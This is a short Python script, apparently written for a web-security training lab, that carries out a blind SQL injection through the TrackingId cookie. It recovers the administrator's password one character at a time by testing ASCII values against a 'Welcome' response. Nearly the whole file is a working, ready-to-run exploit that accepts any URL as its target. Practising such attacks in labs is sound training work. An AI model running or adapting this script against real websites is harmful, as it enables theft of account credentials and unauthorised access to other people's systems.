import sys
import requests
import urllib3
import urllib 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Sending the requests to burp, to able to debug, incase of an error.
proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#Function that will show in real time the password entries, until it finds the matching password. 
def sqli_password(url):
    password_extracted = ''
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username = 'administrator')='%s" %(i,j)
            sqli_payload_encode = urllib.parse.quote(sqli_payload)
            #Update the TrackingId and the Session, when doing a new test.
            cookie = {'TrackingId': 'yLtfoRptErcfJfju' + sqli_payload_encode, 'Session': '9mcbVODKs6gzyDLzyNlLxFmqiqZjHDTQ'}
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        #Correct way
        print("[+] Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("[+] Retrieving administrator password")
    sqli_password(url)

if __name__ == "__main__":
    main()